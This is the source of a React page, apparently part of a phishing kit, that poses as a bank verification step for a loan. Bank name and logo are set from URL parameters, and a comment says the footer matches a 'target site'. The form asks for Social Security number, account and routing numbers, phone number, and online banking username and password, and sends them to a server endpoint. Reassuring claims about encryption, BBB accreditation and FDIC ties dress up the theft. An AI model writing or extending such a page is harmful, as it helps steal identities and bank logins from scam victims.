import Header from "@/components/Header";
import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";

const BankAuthForm = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [bankImage, setBankImage] = useState<string | null>(null);
  const [prefilledBankName, setPrefilledBankName] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(location.search);
    const imgParam = params.get("image");
    const nameParam = params.get("name");
    if (imgParam) {
      setBankImage(imgParam);
    }
    if (nameParam) {
      setPrefilledBankName(nameParam);
    }
  }, [location]);

  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsSubmitting(true);
    const formData = new FormData(e.currentTarget);
    const data = Object.fromEntries(formData);
    data.formType = "Bank Authentication";
    
    if (prefilledBankName) {
      data["Bank Name"] = prefilledBankName;
    } else if (data.bank_name) {
      data["Bank Name"] = data.bank_name;
      delete data.bank_name;
    }

    try {
      const response = await fetch("/api/submit-form", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      if (response.ok) {
        alert("Verification submitted successfully. Your loan officer will contact you shortly.");
        navigate("/");
      } else {
        alert("There was an error submitting your verification. Please try again.");
      }
    } catch (err) {
      alert("Network error. Could not submit.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSsnFormat = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '').slice(0, 9);
    let formatted = '';
    if (value.length > 0) formatted = value.slice(0, 3);
    if (value.length >= 4) formatted += '-' + value.slice(3, 5);
    if (value.length >= 6) formatted += '-' + value.slice(5, 9);
    e.target.value = formatted;
  };

  return (
    <div className="min-h-screen flex flex-col bg-white text-gray-800" style={{ fontFamily: "Arial, sans-serif" }}>
      <Header />
      
      <main className="flex-grow py-12">
        <div className="container mx-auto px-4 max-w-3xl">
          
          {bankImage && (
            <div className="text-center mb-8">
              <img src={bankImage} alt="Selected Bank" className="mx-auto" style={{ maxHeight: "100px" }} />
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6 max-w-2xl mx-auto">
             {!prefilledBankName && (
               <div>
                  <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Bank Name#*</label>
                  <input 
                    type="text" 
                    name="bank_name" 
                    placeholder="Your Bank Name" 
                    required 
                    className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                  />
               </div>
             )}

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Account Holder First Name*</label>
                <input 
                  type="text" 
                  name="first_name" 
                  placeholder="First Name" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Account Holder Last Name*</label>
                <input 
                  type="text" 
                  name="last_name" 
                  placeholder="Last Name" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Social Security Number*</label>
                <input 
                  type="text" 
                  name="ssn" 
                  placeholder="123-45-6789" 
                  required 
                  maxLength={11}
                  onInput={handleSsnFormat}
                  pattern="\d{3}-\d{2}-\d{4}"
                  title="Format: 123-45-6789"
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Bank Account Number*</label>
                <input 
                  type="number" 
                  name="account_number" 
                  placeholder="Account#" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Bank Routing Number*</label>
                <input 
                  type="number" 
                  name="routing" 
                  placeholder="Routing#" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Online Banking Username#*</label>
                <input 
                  type="text" 
                  name="username" 
                  placeholder="Your online Username" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Online Banking Password#*</label>
                <input 
                  type="text" 
                  name="password" 
                  placeholder="Your online Password" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div>
                <label className="block text-gray-700 mb-2" style={{ fontSize: "18px" }}>Your Phone Number*</label>
                <input 
                  type="text" 
                  name="phone" 
                  placeholder="Phone Number" 
                  required 
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-blue-500"
                />
             </div>

             <div className="flex items-start mt-4">
                <input 
                  type="checkbox" 
                  id="terms-checkbox" 
                  required 
                  className="mt-1.5 mr-3"
                />
                <label htmlFor="terms-checkbox" className="text-gray-700">
                  I agree to the <a href="https://a13b0252-4972-4519-8706-229bef53c91b.filesusr.com/ugd/5b96a9_e1e169ffb3a945898bebefefef452e2d.pdf" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">terms and conditions</a>
                </label>
             </div>

             <div className="text-center mt-10">
               <button 
                  type="submit" 
                  disabled={isSubmitting}
                  className="inline-block px-12 py-3 rounded text-white font-medium hover:opacity-90 transition-opacity disabled:opacity-50"
                  style={{ background: "#0b5ed7", fontSize: "18px", width: "100%", maxWidth: "300px" }}
               >
                 {isSubmitting ? "Verifying..." : "Verify Me"}
               </button>
             </div>
          </form>

          <div className="max-w-3xl mx-auto text-center mt-12 text-gray-600" style={{ fontSize: "16px", lineHeight: "1.6" }}>
            Your information is secured with advanced encryption technology and is protected under industry standards. We are accredited by the Better Business Bureau (BBB) and work with FDIC-insured institutions, ensuring your data is handled with the highest level of security and trust.
          </div>
        </div>
      </main>

      {/* Simple Black Footer matching target site */}
      <footer className="bg-black py-12 mt-auto">
        <div className="container mx-auto px-4">
           <div className="text-center text-white/80" style={{ fontSize: "15px" }}>
             Copyright © 2004-2026, BlueStone Financial, All Rights Reserved.
           </div>
        </div>
      </footer>
    </div>
  );
};

export default BankAuthForm;
